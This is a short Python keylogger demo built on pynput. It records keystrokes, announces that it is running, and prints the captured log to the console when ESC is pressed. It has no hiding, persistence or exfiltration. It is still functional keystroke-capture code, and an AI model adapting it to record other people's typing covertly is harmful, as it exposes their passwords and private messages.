from pynput import keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char  # For alphanumeric keys
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "  # Spaces between words
        else:
            log += f" [{key.name}] "  # Special keys (e.g., Enter, Shift)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stops listener when ESC is pressed
        print("[+] Exiting...")
        print("[+] Final Log:", log)
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("[+] Keylogger running... Press ESC to stop.")
    listener.join()


#ph1n3y
